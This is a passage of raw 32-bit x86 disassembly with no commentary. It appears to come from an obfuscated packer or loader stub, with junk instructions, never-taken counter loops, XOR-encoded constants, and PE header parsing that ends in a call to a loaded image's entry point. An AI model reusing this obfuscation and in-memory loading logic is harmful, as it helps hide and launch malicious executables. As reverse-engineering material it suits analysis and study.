  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42ee20,0x4304ba
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x4304c2
  4094b1:	and    DWORD PTR ds:0x4304be,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e776,0x43049a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x4304a6
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42ee2c,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42ee2c,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42ee2c,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ebb8
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42ee2c
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42ee2c,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e76a
  409527:	or     edi,DWORD PTR ds:0x43053e
  40952d:	mov    DWORD PTR ds:0x42e76a,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x4304a2,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43049a
  40955e:	sbb    DWORD PTR ds:0x42ee0c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42ee24,0x19
  409570:	cmp    DWORD PTR ds:0x42ee24,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42ee24,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42eab8
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42ee24
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42ee24,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e75e,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e75e
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e75e,edi
  4095f1:	cmp    DWORD PTR ds:0x42e75e,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e75e,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ebbc
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e762,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x4304a2
  409649:	sub    DWORD PTR ds:0x43048a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42ee2c,0x4304a2
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x4304aa,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e76e,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e75e,0x1f
  409686:	cmp    DWORD PTR ds:0x42e75e,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e75e,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42ead4
  4096b3:	cmp    DWORD PTR ds:0x42e75e,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e75e
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e75e,eax
  4096cb:	mov    eax,ds:0x42e75e
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e75e,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42ee24,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42ee24
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42ee24,ecx
  4096f7:	cmp    DWORD PTR ds:0x42ee24,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42ee24,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430492
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ebc0
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43048a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ee14,0x1a
  409737:	cmp    DWORD PTR ds:0x42ee14,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ee14,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42ee2c
  409763:	call   DWORD PTR ds:0x42ebc4
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ee14
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ee14,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x4304ae,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x43054e,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ee18
  4097a8:	sub    DWORD PTR ds:0x42e762,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x430546
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e75a,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e75a
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e75a,edx
  4097d5:	cmp    DWORD PTR ds:0x42e75a,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x430556
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42ead8
  4097f0:	cmp    DWORD PTR ds:0x42e75a,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e75a
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e75a,edx
  40980a:	cmp    DWORD PTR ds:0x42e75a,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x430542,0x1c
  40982b:	cmp    DWORD PTR ds:0x430542,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x430542,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ebc8
  409850:	cmp    DWORD PTR ds:0x430542,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x430542
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x430542,edx
  40986a:	mov    edx,DWORD PTR ds:0x430542
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x430542,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ee14,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x43054a,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x4304a2,0x42e772
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x4304ba,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x4304ba
  4098b7:	inc    eax
  4098b8:	mov    ds:0x4304ba,eax
  4098bd:	cmp    DWORD PTR ds:0x4304ba,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x4304ba,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42ebcc
  4098eb:	cmp    DWORD PTR ds:0x4304ba,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x4304ba
  4098fd:	inc    eax
  4098fe:	mov    ds:0x4304ba,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x4304c2,0x4304a6
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ee1c,0x42e76e
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ee14,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ee14
  409945:	inc    eax
  409946:	mov    ds:0x42ee14,eax
  40994b:	cmp    DWORD PTR ds:0x42ee14,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ee14,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42eae0
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43049e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e75e,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x4304c2
  409998:	xor    ecx,DWORD PTR ds:0x4304be
  40999e:	mov    DWORD PTR ds:0x4304c2,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x4304b6,0x42ee14
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e76a,0x42ee08
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x4304ba,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x4304b2,0x4304c2
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e75e,0x42e76a
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e772,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x430546,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e75a,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430486,0x430552
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e75e
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x43055a,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e76e,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e76e,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ee10,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43049a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e75e,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x43054e,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x4304be,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x43055a,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x43054a,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x430552,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ee0c,0x42e75e
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x4304ba
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ee0c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x430546,0x42ee28
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e76a,0x43049a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x4304aa,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e75e,0x43054e
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x4304c2
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42ee28,0x430496
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42ee24,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430486,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430496
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x4304a2,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43048e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x4304ba,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x4304a2,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e776,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x4304be,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x430542,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x430546,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x430546,0x42ee0c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
